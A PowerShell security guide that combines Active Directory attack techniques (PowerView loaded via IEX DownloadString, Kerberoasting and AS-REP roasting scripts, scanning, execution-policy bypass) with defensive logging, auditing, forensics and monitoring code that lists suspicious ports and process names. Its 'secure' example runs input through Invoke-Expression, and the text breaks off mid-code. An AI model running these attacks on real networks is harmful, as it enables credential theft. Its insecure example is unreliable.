# PowerShell for Security Guide

[![PowerShell](https://img.shields.io/badge/PowerShell-Security-blue?style=for-the-badge&logo=powershell)](https://github.com/gotr00t0day)
[![Windows](https://img.shields.io/badge/Windows-Security-red?style=for-the-badge&logo=windows)](https://docs.microsoft.com/en-us/powershell/)
[![Automation](https://img.shields.io/badge/Security-Automation-green?style=for-the-badge&logo=automate)](https://github.com/PowerShell/PowerShell)

## Table of Contents

1. [Introduction](#introduction)
2. [PowerShell Security Fundamentals](#powershell-security-fundamentals)
3. [Active Directory Security](#active-directory-security)
4. [Network Security & Reconnaissance](#network-security--reconnaissance)
5. [Windows Security Auditing](#windows-security-auditing)
6. [Incident Response & Forensics](#incident-response--forensics)
7. [Log Analysis & SIEM Integration](#log-analysis--siem-integration)
8. [Malware Analysis](#malware-analysis)
9. [Penetration Testing Tools](#penetration-testing-tools)
10. [Security Automation](#security-automation)
11. [Advanced Techniques](#advanced-techniques)
12. [Defensive PowerShell](#defensive-powershell)
13. [Compliance & Auditing](#compliance--auditing)
14. [Empire & C2 Frameworks](#empire--c2-frameworks)
15. [Best Practices](#best-practices)
16. [Resources](#resources)

---

## Introduction

PowerShell has become an essential tool for cybersecurity professionals working in Windows environments. This guide covers both offensive and defensive security techniques using PowerShell, from basic system administration to advanced penetration testing and incident response.

### Why PowerShell for Security?
- **Native Windows Integration**: Deep access to Windows APIs and systems
- **Remote Management**: WinRM and PowerShell remoting capabilities
- **Extensive Modules**: Rich ecosystem of security-focused modules
- **Automation**: Powerful scripting capabilities for repetitive tasks
- **Cross-Platform**: PowerShell Core runs on Linux and macOS

---

## PowerShell Security Fundamentals

### PowerShell Execution Policies

#### Understanding Execution Policies
```powershell
# Check current execution policy
Get-ExecutionPolicy -List

# Set execution policy for current user
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Set execution policy for all users (requires admin)
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine

# Bypass execution policy for single command
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Common execution policies
# Restricted: No scripts allowed
# AllSigned: Only signed scripts allowed
# RemoteSigned: Local scripts allowed, remote scripts must be signed
# Unrestricted: All scripts allowed with warning
# Bypass: All scripts allowed without warning
```

#### PowerShell Logging and Monitoring
```powershell
# Enable PowerShell logging
$LoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

# Script block logging
if (!(Test-Path "$LoggingPath\ScriptBlockLogging")) {
    New-Item -Path "$LoggingPath\ScriptBlockLogging" -Force
}
Set-ItemProperty -Path "$LoggingPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Module logging
if (!(Test-Path "$LoggingPath\ModuleLogging")) {
    New-Item -Path "$LoggingPath\ModuleLogging" -Force
}
Set-ItemProperty -Path "$LoggingPath\ModuleLogging" -Name "EnableModuleLogging" -Value 1

# Transcription logging
if (!(Test-Path "$LoggingPath\Transcription")) {
    New-Item -Path "$LoggingPath\Transcription" -Force
}
Set-ItemProperty -Path "$LoggingPath\Transcription" -Name "EnableTranscription" -Value 1
Set-ItemProperty -Path "$LoggingPath\Transcription" -Name "OutputDirectory" -Value "C:\PSTranscripts"
```

### PowerShell Security Modules

#### Installing Essential Security Modules
```powershell
# Install PowerShell security modules
Install-Module -Name PowerSploit -Force
Install-Module -Name Empire -Force
Install-Module -Name Nishang -Force
Install-Module -Name PowerUpSQL -Force
Install-Module -Name PowerView -Force
Install-Module -Name Invoke-Obfuscation -Force
Install-Module -Name PoshRSJob -Force

# Import modules
Import-Module PowerSploit
Import-Module PowerUpSQL
Import-Module PowerView
```

---

## Active Directory Security

### Active Directory Reconnaissance

#### Domain Information Gathering
```powershell
# Get domain information
$Domain = Get-ADDomain
Write-Host "Domain Name: $($Domain.DNSRoot)"
Write-Host "Domain Controller: $($Domain.PDCEmulator)"
Write-Host "Domain Functional Level: $($Domain.DomainMode)"

# Get forest information
$Forest = Get-ADForest
Write-Host "Forest Name: $($Forest.Name)"
Write-Host "Forest Functional Level: $($Forest.ForestMode)"

# Get domain controllers
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address, OperatingSystem

# Get domain trusts
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType

# Get domain policy
Get-ADDefaultDomainPasswordPolicy
```

#### User and Group Enumeration
```powershell
# Get all users
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Enabled, LastLogonDate, PasswordLastSet

# Get privileged users
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName
Get-ADGroupMember -Identity "Enterprise Admins" | Select-Object Name, SamAccountName
Get-ADGroupMember -Identity "Schema Admins" | Select-Object Name, SamAccountName

# Get users with SPN (potential Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Get computers
Get-ADComputer -Filter * -Properties * | Select-Object Name, OperatingSystem, IPv4Address, LastLogonDate

# Get group policy objects
Get-GPO -All | Select-Object DisplayName, GpoStatus, CreationTime, ModificationTime
```

### PowerView for AD Reconnaissance

#### Domain Enumeration with PowerView
```powershell
# Load PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Get domain information
Get-Domain
Get-DomainController

# Get domain users
Get-DomainUser | Select-Object samaccountname, description, pwdlastset, lastlogon

# Get domain groups
Get-DomainGroup | Select-Object samaccountname, description

# Get domain computers
Get-DomainComputer | Select-Object samaccountname, operatingsystem, lastlogon

# Find domain shares
Find-DomainShare -CheckShareAccess

# Get domain trusts
Get-DomainTrust

# Find interesting files
Find-InterestingDomainShareFile -Include *.doc, *.docx, *.xls, *.xlsx, *.ppt, *.pptx, *.pdf, *.txt

# Get GPO information
Get-DomainGPO | Select-Object displayname, whenchanged

# Find local admin access
Find-DomainLocalGroupMember -GroupName "Administrators"

# Find domain admin sessions
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### Kerberoasting and ASREPRoasting

#### Kerberoasting Attack
```powershell
# Get users with SPN
$SPNUsers = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

foreach ($User in $SPNUsers) {
    Write-Host "User: $($User.SamAccountName)"
    Write-Host "SPN: $($User.ServicePrincipalName)"
    
    # Request TGS ticket
    $TGS = Add-Type -AssemblyName System.IdentityModel
    $TGS = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $User.ServicePrincipalName
    
    # Export ticket for cracking
    $Ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($User.ServicePrincipalName)
    $TicketHex = [Convert]::ToBase64String($Ticket.GetRequest())
    Write-Host "Ticket: $TicketHex"
}
```

#### ASREPRoasting Attack
```powershell
# Find users with pre-authentication disabled
$ASREPUsers = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

foreach ($User in $ASREPUsers) {
    Write-Host "ASREPRoastable user: $($User.SamAccountName)"
    
    # Request AS-REP without pre-authentication
    $ASREPHash = Get-ASREPHash -UserName $User.SamAccountName -Domain $Domain.DNSRoot
    Write-Host "AS-REP Hash: $ASREPHash"
}
```

---

## Network Security & Reconnaissance

### Network Scanning and Enumeration

#### Port Scanning
```powershell
function Invoke-PortScan {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Target,
        
        [Parameter(Mandatory=$false)]
        [int[]]$Ports = @(21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,6000,6001,6002,6003,6004,6005,6006,6007,6008,6009),
        
        [Parameter(Mandatory=$false)]
        [int]$Timeout = 1000
    )
    
    $OpenPorts = @()
    
    foreach ($Port in $Ports) {
        $TcpClient = New-Object System.Net.Sockets.TcpClient
        $Connect = $TcpClient.BeginConnect($Target, $Port, $null, $null)
        $Wait = $Connect.AsyncWaitHandle.WaitOne($Timeout, $false)
        
        if ($Wait) {
            try {
                $TcpClient.EndConnect($Connect)
                $OpenPorts += $Port
                Write-Host "Port $Port is open on $Target" -ForegroundColor Green
            } catch {
                Write-Host "Port $Port is closed on $Target" -ForegroundColor Red
            }
        }
        
        $TcpClient.Close()
    }
    
    return $OpenPorts
}

# Usage
$Target = "192.168.1.1"
$OpenPorts = Invoke-PortScan -Target $Target
Write-Host "Open ports on $Target`: $($OpenPorts -join ', ')"
```

#### Network Discovery
```powershell
function Invoke-NetworkDiscovery {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Network
    )
    
    $NetworkBase = $Network.Substring(0, $Network.LastIndexOf('.'))
    $ActiveHosts = @()
    
    1..254 | ForEach-Object {
        $IP = "$NetworkBase.$_"
        $Ping = Test-Connection -ComputerName $IP -Count 1 -Quiet
        
        if ($Ping) {
            $ActiveHosts += $IP
            Write-Host "Host $IP is active" -ForegroundColor Green
            
            # Try to resolve hostname
            try {
                $Hostname = [System.Net.Dns]::GetHostByAddress($IP).HostName
                Write-Host "  Hostname: $Hostname"
            } catch {
                Write-Host "  Hostname: Unable to resolve"
            }
        }
    }
    
    return $ActiveHosts
}

# Usage
$Network = "192.168.1.0"
$ActiveHosts = Invoke-NetworkDiscovery -Network $Network
Write-Host "Active hosts found: $($ActiveHosts.Count)"
```

### SMB and NetBIOS Enumeration

#### SMB Share Enumeration
```powershell
function Invoke-SMBEnum {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Target,
        
        [Parameter(Mandatory=$false)]
        [string]$Username,
        
        [Parameter(Mandatory=$false)]
        [string]$Password
    )
    
    Write-Host "Enumerating SMB shares on $Target"
    
    # Get SMB shares
    try {
        if ($Username -and $Password) {
            $Credential = New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))
            $Shares = Get-SmbShare -CimSession $Target -Credential $Credential
        } else {
            $Shares = Get-SmbShare -CimSession $Target
        }
        
        foreach ($Share in $Shares) {
            Write-Host "Share: $($Share.Name) - $($Share.Path)"
            Write-Host "  Description: $($Share.Description)"
            Write-Host "  Type: $($Share.ShareType)"
            
            # Try to access the share
            try {
                $SharePath = "\\$Target\$($Share.Name)"
                $Items = Get-ChildItem -Path $SharePath -Force -ErrorAction Stop
                Write-Host "  Contents: $($Items.Count) items"
                
                # Look for interesting files
                $InterestingFiles = $Items | Where-Object { $_.Extension -match '\.(txt|doc|docx|xls|xlsx|pdf|config|xml|ini)$' }
                if ($InterestingFiles) {
                    Write-Host "  Interesting files found:"
                    $InterestingFiles | ForEach-Object { Write-Host "    $_" }
                }
            } catch {
                Write-Host "  Access denied or error accessing share"
            }
        }
    } catch {
        Write-Host "Error enumerating SMB shares: $($_.Exception.Message)"
    }
}

# Usage
Invoke-SMBEnum -Target "192.168.1.100"
```

---

## Windows Security Auditing

### System Information Gathering

#### Comprehensive System Audit
```powershell
function Invoke-SystemAudit {
    $AuditResults = @{}
    
    # System information
    $AuditResults['System'] = Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory, CsProcessors
    
    # User accounts
    $AuditResults['Users'] = Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, PasswordRequired
    
    # Group memberships
    $AuditResults['Groups'] = Get-LocalGroup | Select-Object Name, Description
    
    # Services
    $AuditResults['Services'] = Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object Name, DisplayName, StartType
    
    # Installed software
    $AuditResults['Software'] = Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor, InstallDate
    
    # Network configuration
    $AuditResults['Network'] = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer
    
    # Firewall status
    $AuditResults['Firewall'] = Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
    
    # Startup programs
    $AuditResults['Startup'] = Get-CimInstance -ClassName Win32_StartupCommand | Select-Object Name, Command, Location
    
    # Scheduled tasks
    $AuditResults['Tasks'] = Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' } | Select-Object TaskName, TaskPath, State
    
    return $AuditResults
}

# Run audit and generate report
$AuditResults = Invoke-SystemAudit
$AuditResults | ConvertTo-Json -Depth 3 | Out-File -FilePath "SystemAudit.json"
```

### Registry Analysis

#### Registry Security Assessment
```powershell
function Invoke-RegistrySecurityScan {
    $SecurityIssues = @()
    
    # Check for common security misconfigurations
    $RegistryChecks = @{
        'UAC Enabled' = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA'
        'Windows Defender Enabled' = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware'
        'Auto Update Enabled' = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\AUOptions'
        'Guest Account Enabled' = 'HKLM:\SAM\SAM\Domains\Account\Users\Names\Guest'
        'Remote Desktop Enabled' = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections'
    }
    
    foreach ($Check in $RegistryChecks.GetEnumerator()) {
        try {
            $Value = Get-ItemProperty -Path $Check.Value -ErrorAction Stop
            
            switch ($Check.Key) {
                'UAC Enabled' {
                    if ($Value.EnableLUA -eq 0) {
                        $SecurityIssues += "UAC is disabled - Security risk"
                    }
                }
                'Windows Defender Enabled' {
                    if ($Value.DisableAntiSpyware -eq 1) {
                        $SecurityIssues += "Windows Defender is disabled - Security risk"
                    }
                }
                'Auto Update Enabled' {
                    if ($Value.AUOptions -eq 1) {
                        $SecurityIssues += "Automatic updates are disabled - Security risk"
                    }
                }
                'Remote Desktop Enabled' {
                    if ($Value.fDenyTSConnections -eq 0) {
                        $SecurityIssues += "Remote Desktop is enabled - Potential security risk"
                    }
                }
            }
        } catch {
            $SecurityIssues += "Unable to check $($Check.Key) - Registry key not found"
        }
    }
    
    # Check for suspicious registry entries
    $SuspiciousKeys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    )
    
    foreach ($Key in $SuspiciousKeys) {
        try {
            $Entries = Get-ItemProperty -Path $Key -ErrorAction Stop
            $Entries.PSObject.Properties | ForEach-Object {
                if ($_.Name -notlike 'PS*') {
                    Write-Host "Startup entry found: $($_.Name) = $($_.Value)"
                }
            }
        } catch {
            Write-Host "Unable to access registry key: $Key"
        }
    }
    
    return $SecurityIssues
}

# Run registry security scan
$SecurityIssues = Invoke-RegistrySecurityScan
if ($SecurityIssues.Count -gt 0) {
    Write-Host "Security issues found:"
    $SecurityIssues | ForEach-Object { Write-Host "  - $_" }
} else {
    Write-Host "No security issues found in registry scan"
}
```

---

## Incident Response & Forensics

### Digital Forensics Collection

#### Memory and System Artifacts
```powershell
function Invoke-ForensicsCollection {
    param(
        [Parameter(Mandatory=$true)]
        [string]$OutputPath
    )
    
    # Create output directory
    if (!(Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force
    }
    
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $CasePath = Join-Path $OutputPath "IR_$Timestamp"
    New-Item -ItemType Directory -Path $CasePath -Force
    
    Write-Host "Starting forensics collection at $CasePath"
    
    # System information
    Get-ComputerInfo | Out-File -FilePath "$CasePath\SystemInfo.txt"
    
    # Running processes
    Get-Process | Select-Object ProcessName, Id, CPU, WorkingSet, StartTime | Out-File -FilePath "$CasePath\Processes.txt"
    
    # Network connections
    Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | Out-File -FilePath "$CasePath\NetworkConnections.txt"
    
    # Services
    Get-Service | Select-Object Name, Status, StartType, ServiceType | Out-File -FilePath "$CasePath\Services.txt"
    
    # Startup programs
    Get-CimInstance -ClassName Win32_StartupCommand | Select-Object Name, Command, Location | Out-File -FilePath "$CasePath\StartupPrograms.txt"
    
    # Scheduled tasks
    Get-ScheduledTask | Select-Object TaskName, TaskPath, State, LastRunTime, NextRunTime | Out-File -FilePath "$CasePath\ScheduledTasks.txt"
    
    # Event logs (last 24 hours)
    $Yesterday = (Get-Date).AddDays(-1)
    Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$Yesterday} | Select-Object TimeCreated, Id, LevelDisplayName, Message | Out-File -FilePath "$CasePath\SecurityEvents.txt"
    Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=$Yesterday} | Select-Object TimeCreated, Id, LevelDisplayName, Message | Out-File -FilePath "$CasePath\SystemEvents.txt"
    
    # Installed programs
    Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor, InstallDate | Out-File -FilePath "$CasePath\InstalledPrograms.txt"
    
    # User accounts
    Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet | Out-File -FilePath "$CasePath\UserAccounts.txt"
    
    # Registry analysis
    $AutorunKeys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    )
    
    $AutorunEntries = @()
    foreach ($Key in $AutorunKeys) {
        try {
            $Entries = Get-ItemProperty -Path $Key -ErrorAction Stop
            $Entries.PSObject.Properties | ForEach-Object {
                if ($_.Name -notlike 'PS*') {
                    $AutorunEntries += "$Key\$($_.Name) = $($_.Value)"
                }
            }
        } catch {
            $AutorunEntries += "Unable to access: $Key"
        }
    }
    $AutorunEntries | Out-File -FilePath "$CasePath\AutorunEntries.txt"
    
    # File system timeline (recent files)
    $RecentFiles = Get-ChildItem -Path C:\ -Recurse -File | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } | Select-Object FullName, LastWriteTime, Length
    $RecentFiles | Out-File -FilePath "$CasePath\RecentFiles.txt"
    
    Write-Host "Forensics collection completed at $CasePath"
    return $CasePath
}

# Usage
$CollectionPath = Invoke-ForensicsCollection -OutputPath "C:\Forensics"
```

### Malware Detection

#### Suspicious Process Analysis
```powershell
function Invoke-MalwareDetection {
    $SuspiciousProcesses = @()
    $SuspiciousNetworkConnections = @()
    
    # Get all running processes
    $Processes = Get-Process | Select-Object ProcessName, Id, CPU, WorkingSet, StartTime, Path
    
    # Check for suspicious processes
    $SuspiciousNames = @('powershell', 'cmd', 'wscript', 'cscript', 'mshta', 'regsvr32', 'rundll32', 'svchost')
    
    foreach ($Process in $Processes) {
        # Check for suspicious process names
        if ($SuspiciousNames -contains $Process.ProcessName.ToLower()) {
            $SuspiciousProcesses += $Process
        }
        
        # Check for processes without a valid path
        if ([string]::IsNullOrEmpty($Process.Path)) {
            $SuspiciousProcesses += $Process
        }
        
        # Check for high CPU usage
        if ($Process.CPU -gt 80) {
            $SuspiciousProcesses += $Process
        }
    }
    
    # Check for suspicious network connections
    $NetworkConnections = Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }
    
    foreach ($Connection in $NetworkConnections) {
        # Check for connections to uncommon ports
        if ($Connection.RemotePort -in @(4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337)) {
            $SuspiciousNetworkConnections += $Connection
        }
        
        # Check for connections to private/localhost from external processes
        if ($Connection.RemoteAddress -match '^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.)') {
            $SuspiciousNetworkConnections += $Connection
        }
    }
    
    # Generate report
    $Report = @{
        'SuspiciousProcesses' = $SuspiciousProcesses
        'SuspiciousNetworkConnections' = $SuspiciousNetworkConnections
        'Timestamp' = Get-Date
    }
    
    return $Report
}

# Run malware detection
$MalwareReport = Invoke-MalwareDetection
if ($MalwareReport.SuspiciousProcesses.Count -gt 0) {
    Write-Host "Suspicious processes found:"
    $MalwareReport.SuspiciousProcesses | ForEach-Object { Write-Host "  - $($_.ProcessName) (PID: $($_.Id))" }
}

if ($MalwareReport.SuspiciousNetworkConnections.Count -gt 0) {
    Write-Host "Suspicious network connections found:"
    $MalwareReport.SuspiciousNetworkConnections | ForEach-Object { Write-Host "  - $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)" }
}
```

---

## Log Analysis & SIEM Integration

### Event Log Analysis

#### Security Event Monitoring
```powershell
function Invoke-SecurityEventAnalysis {
    param(
        [Parameter(Mandatory=$false)]
        [int]$Hours = 24
    )
    
    $StartTime = (Get-Date).AddHours(-$Hours)
    $SecurityEvents = @()
    
    # Critical security events to monitor
    $CriticalEvents = @{
        4624 = 'Successful Logon'
        4625 = 'Failed Logon'
        4648 = 'Logon with Explicit Credentials'
        4672 = 'Special Privileges Assigned'
        4720 = 'User Account Created'
        4726 = 'User Account Deleted'
        4728 = 'User Added to Global Group'
        4732 = 'User Added to Local Group'
        4756 = 'User Added to Universal Group'
        5140 = 'Network Share Accessed'
        5156 = 'Network Connection Allowed'
    }
    
    foreach ($EventId in $CriticalEvents.Keys) {
        try {
            $Events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=$EventId; StartTime=$StartTime} -ErrorAction Stop
            
            foreach ($Event in $Events) {
                $EventDetails = @{
                    'EventId' = $Event.Id
                    'EventName' = $CriticalEvents[$Event.Id]
                    'TimeCreated' = $Event.TimeCreated
                    'UserId' = $Event.UserId
                    'Message' = $Event.Message
                    'Computer' = $Event.MachineName
                }
                $SecurityEvents += $EventDetails
            }
        } catch {
            Write-Host "No events found for Event ID $EventId"
        }
    }
    
    # Analyze patterns
    $FailedLogons = $SecurityEvents | Where-Object { $_.EventId -eq 4625 }
    $SuccessfulLogons = $SecurityEvents | Where-Object { $_.EventId -eq 4624 }
    $PrivilegeEscalations = $SecurityEvents | Where-Object { $_.EventId -eq 4672 }
    
    # Generate summary
    $Summary = @{
        'TotalEvents' = $SecurityEvents.Count
        'FailedLogons' = $FailedLogons.Count
        'SuccessfulLogons' = $SuccessfulLogons.Count
        'PrivilegeEscalations' = $PrivilegeEscalations.Count
        'TimeRange' = "$StartTime to $(Get-Date)"
    }
    
    return @{
        'Summary' = $Summary
        'Events' = $SecurityEvents
    }
}

# Run security event analysis
$SecurityAnalysis = Invoke-SecurityEventAnalysis -Hours 24
Write-Host "Security Event Analysis Summary:"
Write-Host "Total Events: $($SecurityAnalysis.Summary.TotalEvents)"
Write-Host "Failed Logons: $($SecurityAnalysis.Summary.FailedLogons)"
Write-Host "Successful Logons: $($SecurityAnalysis.Summary.SuccessfulLogons)"
Write-Host "Privilege Escalations: $($SecurityAnalysis.Summary.PrivilegeEscalations)"
```

### SIEM Integration

#### Log Export for SIEM
```powershell
function Export-LogsForSIEM {
    param(
        [Parameter(Mandatory=$true)]
        [string]$OutputPath,
        
        [Parameter(Mandatory=$false)]
        [int]$Hours = 24,
        
        [Parameter(Mandatory=$false)]
        [string]$Format = 'JSON'
    )
    
    $StartTime = (Get-Date).AddHours(-$Hours)
    $LogData = @()
    
    # Export Security logs
    $SecurityLogs = Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$StartTime} | Select-Object TimeCreated, Id, LevelDisplayName, Message, MachineName, UserId
    
    foreach ($Log in $SecurityLogs) {
        $LogEntry = @{
            'Timestamp' = $Log.TimeCreated.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
            'EventId' = $Log.Id
            'Level' = $Log.LevelDisplayName
            'Message' = $Log.Message
            'Source' = 'Security'
            'Computer' = $Log.MachineName
            'UserId' = $Log.UserId
        }
        $LogData += $LogEntry
    }
    
    # Export System logs
    $SystemLogs = Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=$StartTime} | Select-Object TimeCreated, Id, LevelDisplayName, Message, MachineName
    
    foreach ($Log in $SystemLogs) {
        $LogEntry = @{
            'Timestamp' = $Log.TimeCreated.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
            'EventId' = $Log.Id
            'Level' = $Log.LevelDisplayName
            'Message' = $Log.Message
            'Source' = 'System'
            'Computer' = $Log.MachineName
        }
        $LogData += $LogEntry
    }
    
    # Export in specified format
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $OutputFile = Join-Path $OutputPath "WindowsLogs_$Timestamp"
    
    switch ($Format.ToUpper()) {
        'JSON' {
            $LogData | ConvertTo-Json -Depth 3 | Out-File -FilePath "$OutputFile.json"
        }
        'CSV' {
            $LogData | Export-Csv -Path "$OutputFile.csv" -NoTypeInformation
        }
        'XML' {
            $LogData | ConvertTo-Xml -Depth 3 | Out-File -FilePath "$OutputFile.xml"
        }
        default {
            $LogData | ConvertTo-Json -Depth 3 | Out-File -FilePath "$OutputFile.json"
        }
    }
    
    Write-Host "Logs exported to $OutputFile.$($Format.ToLower())"
    return "$OutputFile.$($Format.ToLower())"
}

# Usage
$ExportPath = Export-LogsForSIEM -OutputPath "C:\Logs" -Hours 24 -Format "JSON"
```

---

## Security Automation

### Automated Security Monitoring

#### Continuous Security Monitoring Script
```powershell
function Start-SecurityMonitoring {
    param(
        [Parameter(Mandatory=$false)]
        [int]$IntervalMinutes = 15,
        
        [Parameter(Mandatory=$false)]
        [string]$LogPath = "C:\SecurityMonitoring"
    )
    
    if (!(Test-Path $LogPath)) {
        New-Item -ItemType Directory -Path $LogPath -Force
    }
    
    Write-Host "Starting continuous security monitoring..."
    Write-Host "Monitoring interval: $IntervalMinutes minutes"
    Write-Host "Log path: $LogPath"
    
    while ($true) {
        $Timestamp = Get-Date
        Write-Host "Running security checks at $Timestamp"
        
        # Check for suspicious processes
        $SuspiciousProcesses = Get-Process | Where-Object { 
            $_.ProcessName -in @('powershell', 'cmd', 'wscript', 'cscript', 'mshta') -and
            $_.StartTime -gt (Get-Date).AddMinutes(-$IntervalMinutes)
        }
        
        if ($SuspiciousProcesses) {
            $Alert = @{
                'Timestamp' = $Timestamp
                'AlertType' = 'Suspicious Process'
                'Details' = $SuspiciousProcesses | Select-Object ProcessName, Id, StartTime, Path
            }
            
            $Alert | ConvertTo-Json -Depth 3 | Out-File -FilePath "$LogPath\Alert_$($Timestamp.ToString('yyyyMMdd_HHmmss')).json"
            Write-Host "ALERT: Suspicious processes detected!" -ForegroundColor Red
        }
        
        # Check for failed logon attempts
        $FailedLogons = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddMinutes(-$IntervalMinutes)} -ErrorAction SilentlyContinue
        
        if ($FailedLogons -and $FailedLogons.Count -gt 5) {
            $Alert = @{
                'Timestamp' = $Timestamp
                'AlertType' = 'Multiple Failed Logons'
                'Count' = $FailedLogons.Count
                'Details' = $FailedLogons | Select-Object TimeCreated, Message
            }
            
            $Alert | ConvertTo-Json -Depth 3 | Out-File -FilePath "$LogPath\Alert_$($Timestamp.ToString('yyyyMMdd_HHmmss')).json"
            Write-Host "ALERT: Multiple failed logon attempts detected!" -ForegroundColor Red
        }
        
        # Check for new network connections
        $NetworkConnections = Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }
        $SuspiciousConnections = $NetworkConnections | Where-Object { 
            $_.RemotePort -in @(4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337) 
        }
        
        if ($SuspiciousConnections) {
            $Alert = @{
                'Timestamp' = $Timestamp
                'AlertType' = 'Suspicious Network Connection'
                'Details' = $SuspiciousConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
            }
            
            $Alert | ConvertTo-Json -Depth 3 | Out-File -FilePath "$LogPath\Alert_$($Timestamp.ToString('yyyyMMdd_HHmmss')).json"
            Write-Host "ALERT: Suspicious network connections detected!" -ForegroundColor Red
        }
        
        # Wait for next interval
        Start-Sleep -Seconds ($IntervalMinutes * 60)
    }
}

# Start monitoring (run as background job)
Start-Job -ScriptBlock { Start-SecurityMonitoring -IntervalMinutes 15 -LogPath "C:\SecurityMonitoring" }
```

---

## Best Practices

### PowerShell Security Best Practices

#### Secure PowerShell Development
```powershell
# 1. Always validate input parameters
function Secure-Function {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$UserInput,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet('Read', 'Write', 'Delete')]
        [string]$Action = 'Read',
        
        [Parameter(Mandatory=$false)]
        [ValidateRange(1, 100)]
        [int]$MaxItems = 10
    )
    
    # Input validation
    if ($UserInput -match '[<>"\&]') {
        throw "Invalid characters in input"
    }
    
    # Rest of function logic
    Write-Host "Processing $Action on $UserInput with max $MaxItems items"
}

# 2. Use secure string for sensitive data
function Get-SecureCredential {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Username
    )
    
    $SecurePassword = Read-Host -Prompt "Enter password for $Username" -AsSecureString
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)
    
    return $Credential
}

# 3. Implement proper error handling
function Invoke-SecureOperation {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Operation
    )
    
    try {
        # Perform operation
        $Result = Invoke-Expression $Operation
        
        # Log successful operation
        Write-Host "Operation completed successfully: $Operation"
        
        return $Result
    }
    catch {
        # Log error without exposing sensitive information
        Write-Error "Operation failed: $($_.Exception.Message)"
        
        # Don't expose full error details in production
        return $null
    }
}

# 4. Use constrained language mode for untrusted scripts
$ExecutionContext.SessionState.LanguageMode = 'ConstrainedLanguage'

# 5. Implement logging for security events
function Write-SecurityLog {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet('Information', 'Warning', 'Error')]
        [string]$Level = 'Information'
    )
    
    $LogEntry = @{
